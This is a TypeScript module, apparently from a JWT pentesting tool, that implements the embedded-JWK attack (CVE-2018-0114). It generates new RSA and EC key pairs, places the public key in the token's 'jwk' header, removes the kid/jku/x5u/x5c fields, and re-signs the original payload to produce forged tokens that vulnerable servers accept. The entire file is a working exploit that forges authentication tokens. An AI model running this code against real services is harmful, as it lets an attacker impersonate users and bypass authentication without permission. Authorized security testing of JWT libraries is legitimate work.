/**
 * Embedded JWK Attack (CVE-2018-0114)
 *
 * Generates a fresh RSA/EC key pair, injects the public key as a "jwk" header
 * parameter, and re-signs the token with the new private key.
 * Vulnerable servers that trust the embedded jwk for verification will accept
 * this token.
 */

import { signRSA, signECDSA } from "../crypto/jwt.js";
import { generateRSAKeyPair } from "../crypto/rsa.js";
import { generateECKeyPair } from "../crypto/ecdsa.js";
import type { ParsedJWT, AttackResult } from "../types.js";
import { nanoid } from "../util.js";

export function buildEmbeddedJWKAttacks(parsed: ParsedJWT): AttackResult[] {
  const alg = parsed.header.alg as string;
  const results: AttackResult[] = [];

  const attempt = (
    genFn: () => { publicJwk: Record<string, unknown>; privateKeyPem: string },
    targetAlg: string,
    signFn: (h: Record<string, unknown>, p: Record<string, unknown>, key: string, a: string) => string
  ) => {
    try {
      const { publicJwk, privateKeyPem } = genFn();
      const header = {
        ...parsed.header,
        alg: targetAlg,
        jwk: publicJwk,
        // Remove fields that could conflict
        jku: undefined,
        x5u: undefined,
        x5c: undefined,
        kid: undefined,
      };
      const jwt = signFn(header, parsed.payload, privateKeyPem, targetAlg);
      results.push({
        id: nanoid(),
        technique: "embeddedJwk",
        techniqueName: `Embedded JWK (${targetAlg})`,
        description:
          "CVE-2018-0114: Generates a fresh key pair and embeds the public key in the JWT " +
          'header as a "jwk" parameter, then re-signs with the corresponding private key. ' +
          "Vulnerable servers that use the embedded jwk field for verification will accept this.",
        modifiedJWT: jwt,
        timestamp: Date.now(),
      });
    } catch { /* ignore */ }
  };

  // Always try both RSA and EC variants regardless of original alg
  attempt(() => generateRSAKeyPair(2048), "RS256",
    (h, p, k, a) => signRSA(h as Parameters<typeof signRSA>[0], p, k, a as Parameters<typeof signRSA>[3]));

  if (alg.startsWith("ES") || alg.startsWith("RS") || alg.startsWith("PS")) {
    const ecAlg = alg.startsWith("ES") ? (alg as "ES256" | "ES384" | "ES512") : "ES256";
    attempt(() => generateECKeyPair(ecAlg), ecAlg,
      (h, p, k, a) => signECDSA(h as Parameters<typeof signECDSA>[0], p, k, a as Parameters<typeof signECDSA>[3]));
  }

  return results;
}
